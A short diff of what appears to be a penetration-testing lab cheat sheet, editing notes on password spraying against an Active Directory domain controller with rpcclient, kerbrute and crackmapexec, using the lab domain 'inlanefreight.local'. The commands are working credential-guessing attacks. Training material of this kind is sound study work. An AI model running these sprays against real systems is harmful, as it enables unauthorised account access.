@@ -6,8 +6,8 @@
 for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" <DC-IP> | grep Authority; done
   # find : Account Name: tjohnson, Authority Name: INLANEFREIGHT
 
-# Using Kerbrute for the Attack
-kerbrute passwordspray -d inlanefreight.local --dc <DC-IP> valid_users.txt  Welcome1
+# Using Kerbrute for the Attack (users list must be normale ex:ahmed Not ahmed@domain.com )
+kerbrute passwordspray -d inlanefreight.local --dc <DC-IP> valid_users.txt  Welcome1 
 
 # Using CrackMapExec & Filtering Logon Failures
 sudo crackmapexec smb <DC-IP> -u valid_users.txt -p Password123 --continue-on-success | grep +
